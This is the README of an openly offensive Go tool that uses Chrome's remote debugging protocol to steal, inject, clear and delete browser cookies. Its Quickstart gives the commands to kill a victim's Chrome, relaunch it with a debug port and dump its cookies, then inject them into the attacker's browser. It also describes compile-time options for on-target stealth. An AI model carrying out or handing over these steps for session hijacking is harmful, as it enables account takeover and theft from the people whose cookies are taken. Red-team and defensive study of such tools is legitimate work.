Chrome Cookie Stealer (and injector)
====================================
Attaches to Chrome using its Remote DevTools protocol and
steals/injects/clears/deletes cookies.

Heavily inspired by
[WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut).

Cookies are dumped as JSON objects using Chrome's own
[format](https://chromedevtools.github.io/devtools-protocol/tot/Network/#type-Cookie).
The same format is used for cookies to be loaded.

For legal use only.

Features
--------
- Dump Chrome's cookies
- Inject dumped Cookies into (another instance of) Chrome
- Clear Chrome's cookies
- Defaults settable at compile time

Quickstart
----------
Steal a victim's cookies:
```sh
git clone https://github.com/magisterquis/chromecookiestealer.git
cd chromecookiestealer
go build
pkill Chrome
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome --remote-debugging-port=9222 --restore-last-session # Varies by target
./chromecookiestealer -dump ./cookies.json
```

Inject into the attacker's local browser:
```sh
# Start Chrome with a debug port, as above.
./chromecookiestealer -clear -inject ./cookies.json
```

Usage
-----
```
Usage: chromecookiestealer [options]
Attaches to Chrome using the Remote DevTools Protocol (--remote-debugging-port)
and, in order and as requested:

- Dumps cookies
- Clears cookies
- Injects cookies
- Deletes selected cookies

Parameters for cookies to be deleted should be represented as an array of JSON
objects with the following string fields:

name   - Name of the cookies to remove.
url    - If specified, deletes all the cookies with the given name where domain
         and path match provided URL.
domain - If specified, deletes only cookies with the exact domain.
path   - If specified, deletes only cookies with the exact path.

Filenames may also be "-" for stdin/stdout.

Options:
  -chrome URL
    	Chrome remote debugging URL (default "ws://127.0.0.1:9222")
  -clear
    	Clear browser cookies
  -delete file
    	Name of file containing parameters for cookies to delete
  -dump file
    	Name of file to which to dump stolen cookies
  -inject file
    	Name of file containing cookies to inject
  -no-summary
    	Don't print a summary on exit
  -verbose
    	Enable verbose logging
```

Building
--------
`go build` should be all that's necessary.  The following may be set at
compile time with `-ldflags '-X main.Foo=bar'` for a touch more on-target
stealth.

Variable   | Description
-----------|------------
DumpFile   | Name of a file to which to dump cookies.  Implies `-dump`
InjectFile | Name of a file from which to inject cookies.  Implies `-inject`
DeleteFile | Name of a file with parameters describing cookies to delete.  Implies `-delete`
DoClear    | If set to any value, implies `-clear`

None of the above are set by default.

The Chrome DevTools Protocol is a bit of a moving target.  It may be necessary
to use a newer version of the
[chromedp](https://pkg.go.dev/github.com/chromedp/chromedp) and
[cdproto](https://pkg.go.dev/github.com/chromedp/cdproto) libraries should this
program stop working.  This can be done with
```sh
go get -u -v all
go mod tidy
go build
```
which could well have the side-effect of breaking everything else.

`¯\_(ツ)_/¯`
